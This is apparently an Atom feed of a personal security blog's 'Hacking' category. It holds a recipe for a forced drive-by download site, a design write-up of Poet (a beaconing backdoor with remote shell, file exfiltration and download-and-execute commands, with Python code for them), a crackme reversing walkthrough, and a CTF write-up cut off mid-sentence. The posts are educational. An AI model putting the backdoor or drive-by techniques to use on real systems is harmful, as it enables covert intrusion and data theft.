<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Hacking | Mark Mossberg's Blog]]></title>
  <link href="http://mark.systems/blog/categories/hacking/atom.xml" rel="self"/>
  <link href="http://mark.systems/"/>
  <updated>2015-08-31T23:55:32-04:00</updated>
  <id>http://mark.systems/</id>
  <author>
    <name><![CDATA[Mark Mossberg]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Building a Sketchy Website 101]]></title>
    <link href="http://mark.systems/blog/2015/04/25/building-a-sketchy-website-101/"/>
    <updated>2015-04-25T17:42:10-04:00</updated>
    <id>http://mark.systems/blog/2015/04/25/building-a-sketchy-website-101</id>
    <content type="html"><![CDATA[<p>Back in April, I won a free &ldquo;.club&rdquo; domain through gandi.net&rsquo;s
<a href="https://15.gandi.net">anniversary</a> prize giveaway. I really didn&rsquo;t need
a &ldquo;.club&rdquo; domain in particular, so I thought it would be pretty fun to
register a stereotypical &ldquo;sketchy&rdquo; domain and set it up as a drive-by
download site or something, because while I&rsquo;ve <em>heard</em> of doing this kind of
thing, I&rsquo;ve never actually done it before. Here&rsquo;s a blog post walking through
what I did. The usual disclaimer applies here: I did this purely for my
own education and learning experience and am not responsible for anything
you do with it.</p>

<h3>Step 1: Register your sketchy domain</h3>

<p>I chose <a href="http://freemoviedownload.club">http://freemoviedownload.club</a>.</p>

<h3>Step 2: Set up drive-by downloads</h3>

<p>This involves configuring your web server to automatically set the
<code>Content-Type</code> header of the resource you want to force download
to <code>application/octet-stream</code>. That should make most web browsers trigger
a download file prompt to actually download the file. Safari curiously
doesn&rsquo;t support prompts for downloaded file location like Chrome and Firefox,
so in that case, it will immediately download the file to <code>~/Downloads</code>.</p>

<p>I&rsquo;m going to try to force a drive-by download of a jpg file, so I added
the below config to my <code>.htaccess</code> file in Apache&rsquo;s <code>DocumentRoot</code>.</p>

<pre><code class="xml .htaccess">&lt;Files *.jpg&gt;
        ForceType application/octet-stream
&lt;/Files&gt;
</code></pre>

<p>That will force browers to download the image, rather than rendering it
when a browser tries to access <code>http://freemoviedownload.club/image.jpg</code>, for
example.</p>

<p>At this point, we&rsquo;re technically done. We can send someone a link to a file
and, assuming they say yes to the prompt (or use Safari), download it to their
computer.  But for some extra polish, I want to have an actual website with
content and have the download come from <em>that</em> page.</p>

<h3>Step 3: Redirect</h3>

<p>We can accomplish this with a trivial Javascript redirect that executes
after the page has loaded. We can even add a delay before the download happens
to give them time to read the website or whatever. The redirect will need
to be to the path configured in step 2, but this will give the illusion that
the download is coming from the <code>index.html</code> page.</p>

<p>&#8220;`html index.html
you have arrived at the official free movie download club! enjoy your download</p>

<script type="text/javascript" charset="utf-8">
    function f() { document.location = 'dickbutt.jpg' }
    setTimeout(f, 2000);
</script>


<p>&#8220;`</p>

<p>That&rsquo;s it! Anyone that browses to the website will automatically get a nice
&ldquo;dickbutt.jpg&rdquo; image downloaded to their machine. Again, particularly effective
against Safari and Chrome for Android, in my testing.</p>

<p><img src="/images/sketchy.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Poet: Beacon Based Post-Exploitation]]></title>
    <link href="http://mark.systems/blog/2014/12/13/poet-beacon-based-post-exploitation/"/>
    <updated>2014-12-13T02:38:31-05:00</updated>
    <id>http://mark.systems/blog/2014/12/13/poet-beacon-based-post-exploitation</id>
    <content type="html"><![CDATA[<h3>Introduction</h3>

<p>For the past eight months or so, I&rsquo;ve been working sporadically on a side
project of mine I call <a href="http://github.com/mossberg/poet">Poet</a>. Poet is
basically a tool for hackers that&rsquo;s useful for post exploitation, that is,
<em>after</em> you&rsquo;ve initially exploited and gotten access to the computer you&rsquo;re
not supposed to have access to. Poet is useful because it essentially acts as
a backdoor you can install into a system to help you maintain access once
you&rsquo;ve gotten your foot in the door.</p>

<p>As a disclaimer, I am building Poet purely for my own education and learning experience.
The code is freely available because I think it might be useful to others interested
in learning about this sort of thing. Use it responsibly.</p>

<p>I&rsquo;ve learned a lot during the process of
building this tool and I thought it would be cool to write a blog post (possibly
more to come)
documenting that process.</p>

<h3>Motivation</h3>

<p>The initial motivation for this project came from an experience I had
participating in the 2014 Northeast Collegiate Cyber Defense Competition. In
short, the competition requires a team of students to protect a small
business IT infrastructure from a red team of hackers. Usually the red team
is really good and completely owns you at some point or other throughout
the competition, and at the end they tell you what they did and give
you tips on how to improve. In particular, the red team told us that there
was pre-installed &ldquo;beaconing&rdquo; malware on many of our systems from the start
of the competition that would &ldquo;phone home&rdquo; to a command and control (C2) server
every once in a while to get commands and tasks to execute on the target
system. This idea was pretty interesting to me, and a basic implementation
didn&rsquo;t actually seem <em>too</em> hard to write, so I decided to give it a try, even
though at this point, I had no experience with network programming.</p>

<h3>v0.1</h3>

<p>The first version of Poet was drastically different from the current form
and was just about as simple and primitive as it gets for something
like this. In this version, the client program (executed on target) would
repeatedly attempt to connect to a socket (port 80 by default) on the server (attacker&rsquo;s C2 server)
at a specified interval. If the connection failed (server
wasn&rsquo;t running), the client would sleep, otherwise it would execute
a command sent from the server, sending back the stdout of the command.
The
server simply maintained a queue of commands to execute and would one
by one pop them off the queue and send them to the client, printing out the stdout
when it came back.
This was a great exercise
to learn the basics of socket programming, but of course
wasn&rsquo;t very useful at all, for a number of reasons. First, ideally the client&rsquo;s
interval is very large so as to minimize network use and
remain stealthy but that puts a hard limit on the rate at which
commands can be executed. This system was also very inflexible because there
was no way to reorder or edit commands in the queue, since the &ldquo;user
interface&rdquo; was just a server script that was run with the commands to execute
as arguments. Overall, a good start,
but there was definitely much work ahead to actually make this a semi-realistic tool.</p>

<h3>v0.2</h3>

<p>The second version of Poet involved a pretty substantial redesign although
one of the things to stay the same would be the high
level client/server beaconing dynamic. This is far superior than having the
client attempt to listen on the target&rsquo;s end because in any sort of &ldquo;real&rdquo;
scenario, the target will likely be behind a firewall that will reject
incoming packets on arbitrary ports.
The beaconing model will allow the tool
to bypass most standard firewalls that aren&rsquo;t specifically targeting it because
outbound port 80 traffic is almost certainly
allowed. I later changed the default port to 443 because it&rsquo;s just as
likely to be allowed out and because it could potentially avoid packet inspection,
since traffic on 443 is usually encrypted.</p>

<p>Building on top of this model, there were a couple other brainstorms I had
to build on top of v0.1. Instead of executing a single command for every ping,
what about sending over multiple commands? What about a pastebin/gist URL to
a script that the client
would download and execute? These would help solve the rate limit problem
because an arbitrary number of commands, instead of one, could be executed
for each ping. What about user interface?
What about creating an actual web user interface
for managing the command queue that the client was pulling from each ping?
This would help solve the flexibility problem.</p>

<p>While these would be relatively simple to add to v0.1,
if I asked myself, &ldquo;If I were a hacker, would I
want to use this tool?&rdquo; the answer would be &ldquo;No way!&rdquo; because I would only be able
to interact with my target system via discrete scripts, and I
would have to wait the ideally large time interval between pings to
get any sort of feedback on my actions.</p>

<p>This made it obvious that I would have to move
from a design where each ping from the client was an opportunity for the
user to run <em>x</em> actions on the target,
to a design where each ping from
the client was an opportunity for the user to interactively control the client
for an unlimited time,
and perform actions on the target with continuous feedback.
With this in mind, I opted to use a shell as the user interface on the server
side since it seemed simpler to implement and I was more familiar with
implementing a shell versus something like a web interface (which would
likely have to have a shell built into it anyway for executing commands).
The server design would be similar to that of v0.1 in that the server would
only be running when the user wanted to control the client, and the client
would use the inability to connect to the server as an sign to &ldquo;go to sleep&rdquo;
for another interval, although this isn&rsquo;t strictly necessary. Another server design
I thought of would be an always-on model where the server would always answer
the client&rsquo;s ping with some kind of binary state value, which would work equally
well, but wouldn&rsquo;t be strictly necessary because state can be inferred as
described above.</p>

<p>In designing the actual protocol the client
and server use to communicate, I decided to
use HTTP to mildly obfuscate the client&rsquo;s initial check if
the server is running. The client&rsquo;s ping consists of a
GET request for <code>/style.css</code> on the server <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. Of course, the server isn&rsquo;t
a real web server, but it temporarily masquerades as one for the purposes of
the initial handshake and sends back a hardcoded HTTP response of some random
css file, and launches the control shell for the user. At this point, the
protocol used is as simple as it gets: size of the following data + the data
itself. This being my first time doing socket programming, my implementation
was a little weird and reserved the first five bytes of the data sent over the
wire for the ASCII decimal representation of the size (<code>¯\_(ツ)_/¯</code>), but
hey, it worked.</p>

<p>The majority of the work left for v0.2 was essentially deciding on the features
that the control shell would have and implementing the &ldquo;userland utilities&rdquo;
or commands you could run at the shell. The commands I thought of and implemented
were:</p>

<ul>
<li><code>exec</code>: This was the first command I wrote. It executes one or more commands on
the target, sending the stdout of all of them back in one big chunk of text. I later
added a flag that would save the big chunk to a file in the archive directory.
Useful for stuff like grabbing process dumps.</li>
<li><code>recon</code>: Basically like <code>exec</code>, but the commands are pre-selected and are tailored
towards &ldquo;reconnaissance&rdquo; purposes. Stuff like <code>whoami</code>, <code>id</code>, <code>uname -a</code>, <code>w</code>, etc.</li>
<li><code>shell</code>: Launches an actual remote shell on the target (inside the original
control shell). Was implemented
really crudely in this version with the execution backend on the client simply
being something like</li>
</ul>


<pre><code class="python">subprocess.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT, shell=True).communicate()[0]
</code></pre>

<ul>
<li><code>exfil</code>: Exfiltrate files and saves to the archive directory. Pretty standard.
Current implementation is pretty crude, and loads entire file into memory, rather
than paging the data somehow.</li>
<li><code>selfdestruct</code>: Exit the client and delete script on disk. Without this,
the user would have to do something weird (nay, treasonous?) like
killing the client&rsquo;s process from its own remote shell to completely
turn off the client.</li>
<li><code>dlexec</code>: Download an executable from the internet and execute it. Also
pretty standard, useful for upgrading or installing additional tools on target</li>
<li><code>exit</code>: Pretty self explanatory, this tells the client that the server&rsquo;s
done for now and that the client can now go back to sleep and begin pinging
again in one time interval.</li>
</ul>


<p>This work resulted in a decently functional prototype that could feasibly
be used for post-exploitation.</p>

<h3>v0.3</h3>

<p>Version 0.3 was a pretty arbitrary decision, but mostly involved significant
refactoring of the backend code, with a couple new user facing features.
One notable change was the refactoring of the entire codebase from imperative,
C-style programming to object oriented style, which gave the code much better
structure. The communications protocol was also slightly refactored to be
more standard by reserving the first four bytes for
the binary data size value which simultaneously conserved
bytes sent over the wire and increased the maximum data that could be sent in
one message between client and server. An additional shell command I implemented
was called <code>chint</code>, standing for &ldquo;change interval&rdquo;, which lets the server
change the client&rsquo;s ping delay interval after the client&rsquo;s been started.</p>

<p>All that&rsquo;s great, but the most significant set of improvements in my opinion
were related to fleshing out the remote shell feature. While it &ldquo;worked&rdquo;
to a decent degree for most standard commands there were two main problems with
it that kept it from being a &ldquo;real&rdquo; shell. For reference, here&rsquo;s what the code
looked like for executing commands in v0.2.</p>

<pre><code class="python">def cmd_exec(cmd):
    return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
                    shell=True).communicate()[0]
</code></pre>

<p>For those that aren&rsquo;t as familiar with Python&rsquo;s <code>subprocess</code> library, this
executes an arbitrary command line (<code>cmd</code>), sending the stderr to the stdout,
and returns any stdout of the command.</p>

<p>The first problem was that the shell
output was not continuous &ndash; when executing a command like <code>ls -R /</code>, which
typically results in lots of scrolling output in a normal terminal, my remote
shell would instead block on the server end while the client executed the
command to its completion and sent over the entire stdout as one big piece.
I solved this problem by adapting the code to continuously poll the
stdout file descriptor for new lines of output, sending those over individually
so that the server would get each line of output as soon as it was available.</p>

<p>The second problem was that if certain commands like <code>ping</code> were executed in the shell,
the client would effectively become unusable because <code>ping</code> (when executed
without the <code>-c</code> parameter) is usually ended by being sent a INT signal (SIGINT),
typically by hitting Ctrl-C on the keyboard. The problem is, the client side
had no mechanism to receive signals and send them to the running process, so
it would be eternally running this unending process and the user
would totally lose control of the target. To solve this problem, I needed a way for the
client to simultaneously execute the requested command, <strong>and</strong> listen for
messages from the server, presumably telling the client to end the running
process. To do this, I learned to use the <code>select()</code> function which is an
easy way for an application to multiplex data streams (in this case,
the stdout of the running process, and the socket connection to the server)
and process their data without requiring concurrency at the application
level.</p>

<p>The resulting code from these two fixes is below. Select takes in multiple
file descriptors (File objects in Python) and returns which ones
are readable (in this example). After it returns, I can check which file descriptors
it returned, and proceed accordingly. In the expected case where
we can read from the process&rsquo;s stdout file descriptor, we get a line of
stdout from the process, forwarding it to the server immediately.
In the exceptional case where we can read from the socket, we receive the message,
making sure it contains the proper keyword to end the process (&lsquo;shellterm&rsquo;)
and terminating the process if it does.</p>

<pre><code class="python">proc = sp.Popen(inp, stdout=sp.PIPE, stderr=sp.STDOUT, shell=True)
while True:
    readable = select.select([proc.stdout, s.s], [], [], 30)[0]
    for fd in readable:
        if fd == proc.stdout:  # proc has stdout/err to send
            output = proc.stdout.readline()
            if output:
                s.send(output)
            else:
                return
        elif fd == s.s:  # remote signal from server
            sig = s.recv()
            if sig == 'shellterm':
                proc.terminate()
                return
</code></pre>

<p>That&rsquo;s all for v0.3. Again, the v0.3 decision was pretty arbitrary and I ultimately
chose to ship it because all the other features I had lined up at
the time were
more labor intensive/experimental and I <em>really</em> wanted to get my fancy
new remote shell into master :D.</p>

<h3>Future Work</h3>

<p>At this point, I&rsquo;m pretty satisfied with the state of the project, but as
always, there&rsquo;s more work to be done. Here are some future features/ideas/improvements
that may or may not ever get implemented:</p>

<ul>
<li><strong>crypto</strong>: If anything, I&rsquo;d say encrypted communications are the one thing
keeping this from being a really usable tool. Right now, communications are
sent in the clear essentially, although they are base64 encoded for the slightest
amount of obfuscation. Ideally I&rsquo;d use Python&rsquo;s ssl library, probably doing
something like hardcoding a server public key into the client. A solution
that wouldn&rsquo;t be as much work, but only slightly more secure than the current
cleartext communications would be to use a basic xor cipher which would be
pretty easy to write, and force an analyst to retrieve the key from memory,
or the initial exchange over the network, depending on how I chose to implement it.</li>
<li><strong>protocol improvement</strong>: This shouldn&rsquo;t actually be too hard to implement,
but the data section of a poet message is typically some type of keyword, a space,
then any relevant data. For example, to start a shell, the server sends
over &ldquo;shell&rdquo;, to get recon data, the server sends &ldquo;recon&rdquo;, for an <code>exec</code>
command, the server sends over &ldquo;exec&rdquo; followed by the commands to execute.
Instead of using these string keywords, it would be possible to move them into
the protocol as a single byte after the data size and have some sort
of lookup table for referencing the appropriate action to each key.</li>
<li><strong>interval fuzzing</strong>: Instead of having a strict, predictable delay time
interval for client pings, I could implement some sort of fuzzing so that the delay
time is slightly variable for further obfuscation
purposes.</li>
</ul>


<p>and last, but not least&hellip;</p>

<ul>
<li><strong>botnet</strong>(?!): Now that I more or less have the infrastructure down for
controlling a single client, it would be pretty cool to
fork the project and adapt it for a more distributed design with multiple
clients connecting to the server, all receiving commands to execute.</li>
</ul>


<hr />

<p>Again, all the code for this project is available on <a href="http://github.com/mossberg/poet">github</a>.
Hopefully this was interesting/helpful for some people, and as always thanks for reading!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Writing this post and thinking about this again actually helped me discover a bug in the server where the server would terminate if it happened to receive a non-client HTTP request while waiting for the client. This would enable a third party that wanted to mess with the Poet user to spam the Poet user&rsquo;s machine with HTTP requests (assuming they knew the proper port to send to) at any interval smaller than the Poet interval, and effectively DOS Poet.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Beginner Crackme]]></title>
    <link href="http://mark.systems/blog/2014/10/27/crackme/"/>
    <updated>2014-10-27T00:00:00-04:00</updated>
    <id>http://mark.systems/blog/2014/10/27/crackme</id>
    <content type="html"><![CDATA[<p>As part of an Intro to Security course I&rsquo;m taking, my professor gave us
a crackme style exercise to practice reading x86 assembly and basic
reverse engineering.</p>

<p>The program is pretty simple. It accepts a password as an argument and we&rsquo;re
told that if the password is correct, &ldquo;ok&rdquo; is printed.</p>

<pre><code>$ ./crackme
usage: ./crackme &lt;secret&gt;
$ ./crackme test
$
</code></pre>

<p>As usual, I start by running <code>file</code> on the binary, which shows that it&rsquo;s a
standard x64 ELF binary. <code>file</code> also says that the binary is &ldquo;not stripped&rdquo;, which means
that it includes symbols. All I really know about symbols are that they can
include debugging information about a binary like function and variable names
and some symbols aren&rsquo;t really necessary; they can be stripped out to reduce
the binary&rsquo;s size and make reverse engineering more challenging. Maybe I&rsquo;ll
do a more in depth post on this in the future.</p>

<pre><code>$ file crackme
crackme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=0x3fcf895b7865cb6be6b934640d1519a1e6bd6d39, not stripped
</code></pre>

<p>Next, I run <code>strings</code>, hoping to get lucky and find the password amongst the
strings in the binary. Strings looks for series of printable characters followed
by a NULL, but unfortunately nothing here works as the password.</p>

<pre><code>$ strings crackme
/lib64/ld-linux-x86-64.so.2
exd4
libc.so.6
puts
printf
memcmp
__libc_start_main
__gmon_start__
GLIBC_2.2.5
fffff.
AWAVA
AUATL
[]A\A]A^A_
usage: %s &lt;secret&gt;
;*3$"
</code></pre>

<p>Since that didn&rsquo;t work, we&rsquo;re forced to disassemble the binary and
actually try to reverse engineer it.
We&rsquo;ll start with <code>main</code>.</p>

<pre><code class="asm">$ gdb -batch -ex 'file crackme' -ex 'disas main'
Dump of assembler code for function main:
   0x00000000004004a0 &lt;+0&gt;:     sub    rsp,0x8
   0x00000000004004a4 &lt;+4&gt;:     cmp    edi,0x1
   0x00000000004004a7 &lt;+7&gt;:     jle    0x4004c7 &lt;main+39&gt;
   0x00000000004004a9 &lt;+9&gt;:     mov    rdi,QWORD PTR [rsi+0x8]
   0x00000000004004ad &lt;+13&gt;:    call   0x4005e0 &lt;verify_secret&gt;
   0x00000000004004b2 &lt;+18&gt;:    test   eax,eax
   0x00000000004004b4 &lt;+20&gt;:    je     0x4004c2 &lt;main+34&gt;
   0x00000000004004b6 &lt;+22&gt;:    mov    edi,0x4006e8
   0x00000000004004bb &lt;+27&gt;:    call   0x400450 &lt;puts@plt&gt;
   0x00000000004004c0 &lt;+32&gt;:    xor    eax,eax
   0x00000000004004c2 &lt;+34&gt;:    add    rsp,0x8
   0x00000000004004c6 &lt;+38&gt;:    ret
   0x00000000004004c7 &lt;+39&gt;:    mov    rsi,QWORD PTR [rsi]
   0x00000000004004ca &lt;+42&gt;:    mov    edi,0x4006d4
   0x00000000004004cf &lt;+47&gt;:    xor    eax,eax
   0x00000000004004d1 &lt;+49&gt;:    call   0x400460 &lt;printf@plt&gt;
   0x00000000004004d6 &lt;+54&gt;:    mov    eax,0x1
   0x00000000004004db &lt;+59&gt;:    jmp    0x4004c2 &lt;main+34&gt;
End of assembler dump.
</code></pre>

<p>Let&rsquo;s break this down a little.</p>

<pre><code class="asm">    0x00000000004004a0 &lt;+0&gt;:     sub    rsp,0x8
    0x00000000004004a4 &lt;+4&gt;:     cmp    edi,0x1
    0x00000000004004a7 &lt;+7&gt;:     jle    0x4004c7 &lt;main+39&gt;
</code></pre>

<p>Starting at the beginning, we see the stack pointer decremented as part of
the function prologue. The prologue is a set of setup steps involving
saving the old frame&rsquo;s
base pointer on the stack, reassigning the base pointer to the current
stack pointer, then subtracting the stack pointer a certain amount to make room
on the stack
for local variables, etc. We don&rsquo;t see the former two steps because this is
the main function so it doesn&rsquo;t <em>really</em> have a function calling it, so saving/setting
the base pointer isn&rsquo;t necessary.</p>

<p>Then the <code>edi</code> register is
compared to 1 and if it is less than or equal, we jump to offset 39.</p>

<pre><code class="asm">   0x00000000004004c2 &lt;+34&gt;:    add    rsp,0x8
   0x00000000004004c6 &lt;+38&gt;:    ret
   0x00000000004004c7 &lt;+39&gt;:    mov    rsi,QWORD PTR [rsi]
   0x00000000004004ca &lt;+42&gt;:    mov    edi,0x4006d4
   0x00000000004004cf &lt;+47&gt;:    xor    eax,eax
   0x00000000004004d1 &lt;+49&gt;:    call   0x400460 &lt;printf@plt&gt;
   0x00000000004004d6 &lt;+54&gt;:    mov    eax,0x1
   0x00000000004004db &lt;+59&gt;:    jmp    0x4004c2 &lt;main+34&gt;
</code></pre>

<p>Here at offset 39, we print something then jump to offset 34 where we repair
the stack (undo the sub instruction from the prologue) and return (ending
execution).</p>

<p>This is likely how the program checks the arguments and prints the usage
message if no arguments are supplied (which would cause argc/edi to be 1).</p>

<p>However if we supply an argument, <code>edi</code> is 0x2 and we move past the <code>jle</code>
instruction.</p>

<pre><code class="asm">   0x00000000004004a9 &lt;+9&gt;:     mov    rdi,QWORD PTR [rsi+0x8]
   0x00000000004004ad &lt;+13&gt;:    call   0x4005e0 &lt;verify_secret&gt;
</code></pre>

<p>Here we can see the <code>verify_secret</code> function being called with a parameter
in <code>rdi</code>. This is most likely the argument we passed into the program. We can
confirm this with gdb (I&rsquo;m using it with <a href="http://ropshell.com/peda/">peda</a> here).</p>

<pre><code>gdb-peda$ tele $rsi
0000| 0x7fffffffeb48 --&gt; 0x7fffffffed6e ("/home/vagrant/crackme/crackme")
0008| 0x7fffffffeb50 --&gt; 0x7fffffffed8c --&gt; 0x4548530074736574 ('test')
0016| 0x7fffffffeb58 --&gt; 0x0
</code></pre>

<p>Indeed <code>rsi</code> points to the first element of <code>argv</code>, so incrementing that by 8 bytes
(because 64 bit) points to <code>argv[1]</code>, which is our input.</p>

<p>If we look after the <code>verify_secret</code> call we can see the program checks
if <code>eax</code> is 0 and if it is, jumps to offset 34, ending the program. However, if
<code>eax</code> is not zero, we&rsquo;ll hit a <code>puts</code> call before exiting, which will presumably
print out the &ldquo;ok&rdquo; message we want.</p>

<pre><code class="asm">   0x00000000004004b2 &lt;+18&gt;:    test   eax,eax
   0x00000000004004b4 &lt;+20&gt;:    je     0x4004c2 &lt;main+34&gt;
   0x00000000004004b6 &lt;+22&gt;:    mov    edi,0x4006e8
   0x00000000004004bb &lt;+27&gt;:    call   0x400450 &lt;puts@plt&gt;
   0x00000000004004c0 &lt;+32&gt;:    xor    eax,eax
   0x00000000004004c2 &lt;+34&gt;:    add    rsp,0x8
   0x00000000004004c6 &lt;+38&gt;:    ret
</code></pre>

<p>Now lets disassemble <code>verify_secret</code> to see how the input validation is performed,
and to see how we can make it return non-zero.</p>

<pre><code class="asm">Dump of assembler code for function verify_secret:
   0x00000000004005e0 &lt;+0&gt;:     sub    rsp,0x408
   0x00000000004005e7 &lt;+7&gt;:     movzx  eax,BYTE PTR [rdi]
   0x00000000004005ea &lt;+10&gt;:    mov    rcx,rsp
   0x00000000004005ed &lt;+13&gt;:    test   al,al
   0x00000000004005ef &lt;+15&gt;:    je     0x400622 &lt;verify_secret+66&gt;
   0x00000000004005f1 &lt;+17&gt;:    mov    rdx,rsp
   0x00000000004005f4 &lt;+20&gt;:    jmp    0x400604 &lt;verify_secret+36&gt;
   0x00000000004005f6 &lt;+22&gt;:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x0000000000400600 &lt;+32&gt;:    test   al,al
   0x0000000000400602 &lt;+34&gt;:    je     0x400622 &lt;verify_secret+66&gt;
   0x0000000000400604 &lt;+36&gt;:    xor    eax,0xfffffff7
   0x0000000000400607 &lt;+39&gt;:    lea    rsi,[rsp+0x400]
   0x000000000040060f &lt;+47&gt;:    add    rdx,0x1
   0x0000000000400613 &lt;+51&gt;:    mov    BYTE PTR [rdx-0x1],al
   0x0000000000400616 &lt;+54&gt;:    add    rdi,0x1
   0x000000000040061a &lt;+58&gt;:    movzx  eax,BYTE PTR [rdi]
   0x000000000040061d &lt;+61&gt;:    cmp    rdx,rsi
   0x0000000000400620 &lt;+64&gt;:    jb     0x400600 &lt;verify_secret+32&gt;
   0x0000000000400622 &lt;+66&gt;:    mov    edx,0x18
   0x0000000000400627 &lt;+71&gt;:    mov    esi,0x600a80
   0x000000000040062c &lt;+76&gt;:    mov    rdi,rcx
   0x000000000040062f &lt;+79&gt;:    call   0x400480 &lt;memcmp@plt&gt;
   0x0000000000400634 &lt;+84&gt;:    test   eax,eax
   0x0000000000400636 &lt;+86&gt;:    sete   al
   0x0000000000400639 &lt;+89&gt;:    add    rsp,0x408
   0x0000000000400640 &lt;+96&gt;:    movzx  eax,al
   0x0000000000400643 &lt;+99&gt;:    ret
End of assembler dump.
</code></pre>

<p>I won&rsquo;t walk through this one in detail because understanding each line
isn&rsquo;t necessary to crack this. Let&rsquo;s skip to
the memcmp call. If memcmp returns 0, <code>eax</code> is set to 1 and the function
returns. This is exactly what we want. From the man page, <code>memcmp</code> takes three
parameters, two buffers to compare and their lengths, and returns 0 if the
buffers are identical.</p>

<pre><code class="asm">   0x0000000000400622 &lt;+66&gt;:    mov    edx,0x18
   0x0000000000400627 &lt;+71&gt;:    mov    esi,0x600a80
   0x000000000040062c &lt;+76&gt;:    mov    rdi,rcx
   0x000000000040062f &lt;+79&gt;:    call   0x400480 &lt;memcmp@plt&gt;
</code></pre>

<p>Here&rsquo;s the setup to the <code>memcmp</code> call. We can see the third parameter for length
is the immediate 0x18 meaning the buffers will be 24 bytes in length. If we
examine address 0x600a80, we find this 24 byte string:</p>

<pre><code>gdb-peda$ hexd 0x600a80 /2
0x00600a80 : 91 bf a4 85 85 c3 ba b9 9f a6 b6 b1 93 b9 83 8f   ................
0x00600a90 : ae b1 ae c1 bc 80 ca ca 00 00 00 00 00 00 00 00   ................
</code></pre>

<p>Since this is a direct address to some memory, we can be fairly certain that
we&rsquo;ve found some sort of secret value! Based on the <code>movzx eax,BYTE PTR [rdi]</code>
instruction (offset 7)
which moves a byte from the input string into eax, the <code>xor eax, 0xfffffff7</code>
instruction (offset 36), and
the <code>add rdi, 0x1</code> instruction (offset 54) which increments the char*
pointer to our input string, we can reasonably guess
that this function is xor&#8217;ing each character of our input with 0xf7 and writing
the result into a buffer which begins at <code>rsp</code> (also pointed to by <code>rcx</code>). Since
we now know the secret (<code>\x91\xbf\xa4\x85...</code>) and the xor key (<code>0xf7</code>) it&rsquo;s
pretty easy to extract the password we need by xor&#8217;ing each byte of the secret
with the xor key.</p>

<p>Here&rsquo;s a way to do this with python.</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="nb">str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x91</span>\<span class="n">xbf</span>\<span class="n">xa4</span>\<span class="n">x85</span>\<span class="n">x85</span>\<span class="n">xc3</span>\<span class="n">xba</span>\<span class="n">xb9</span>\<span class="n">x9f</span>\<span class="n">xa6</span>\<span class="n">xb6</span>\<span class="n">xb1</span>\<span class="n">x93</span>\<span class="n">xb9</span>\<span class="n">x83</span>\<span class="n">x8f</span>\<span class="n">xae</span>\<span class="n">xb1</span>\<span class="n">xae</span>\<span class="n">xc1</span>\<span class="n">xbc</span>\<span class="n">x80</span>\<span class="n">xca</span>\<span class="n">xca</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
<span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ba</span><span class="p">):</span>
    <span class="n">ba</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xf7</span>
<span class="k">print</span> <span class="n">ba</span></code></pre></div></p>

<p>Which results in this:</p>

<pre><code>$ python crack.py
fHSrr4MNhQAFdNtxYFY6Kw==
$ ./crackme fHSrr4MNhQAFdNtxYFY6Kw==
ok
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SU-CTF 2014 - "Commerical Application!"]]></title>
    <link href="http://mark.systems/blog/2014/09/27/suctf_re/"/>
    <updated>2014-09-27T00:00:00-04:00</updated>
    <id>http://mark.systems/blog/2014/09/27/suctf_re</id>
    <content type="html"><![CDATA[<p>This weekend I decided to try playing <a href="https://ctftime.org/event/159">SU-CTF</a>.
I&rsquo;m pretty bad at CTF to be honest, so I was pretty thrilled to get
one of the 200 point challenges in the third (of five) difficulty tiers.</p>

<h2>&ldquo;Commerical Application!&rdquo;</h2>

<p>For this challenge, we&rsquo;re given an Android application and the hint:</p>

<blockquote><p>Flag is a serial number.</p></blockquote>

<p>I installed it on my phone, here&rsquo;s what it looks like:</p>

<p><img src="/images/apk1.png" alt="" />
<img src="/images/apk2.png" alt="" />
<img src="/images/apk3.png" alt="" />
<img src="/images/apk4.png" alt="" /></p>

<p>I can tap on &ldquo;Picture-01&rdquo; and sliding to the right reveals this picture, but
if I try to tap on &ldquo;Picture-02&rdquo; or &ldquo;Pictures-03&rdquo; the app says I need to
enter a registration key. If I tap on the gear in the top right, I&rsquo;m
prompted to enter my product key.</p>

<p>Running <code>file</code> reveals that <code>.apk</code> files are apparently just Zip archives,
so let&rsquo;s try simply <code>unzip</code>&lsquo;ing it.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>file suCTF.apk
suCTF.apk: Zip archive data, at least v2.0 to extract
<span class="nv">$ </span>unzip suCTF.apk
Archive:  suCTF.apk
  inflating: assets/db.db
  inflating: res/color/abs&lt;strong&gt;primary_text_disable_only_holo_dark.xml
  inflating: res/color/abs&lt;/strong&gt;primary_text_disable_only_holo_light.xml
  <span class="p">&amp;</span>hellip<span class="p">;</span>
  inflating: classes.dex
  inflating: META-INF/MANIFEST.MF
  inflating: META-INF/CERT.SF
  inflating: META-INF/CERT.RSA</code></pre></div></p>

<p>Cool! Now we have all the miscellaneous files that comprise the app. There&rsquo;s
a database file, various <code>.xml</code> design files, and most interestingly, a
<code>classes.dex</code> file. <code>.dex</code> files contain bytecode run on the Android Dalvik VM, which
is currently the Java runtime for Android devices, so <code>classes.dex</code> likely
contains the code that runs the app, in compiled form. We can use the nifty
<code>d2j-dex2jar</code> utility for decompiling it into a <code>classes-dex2jar.jar</code> file. <code>.jar</code>
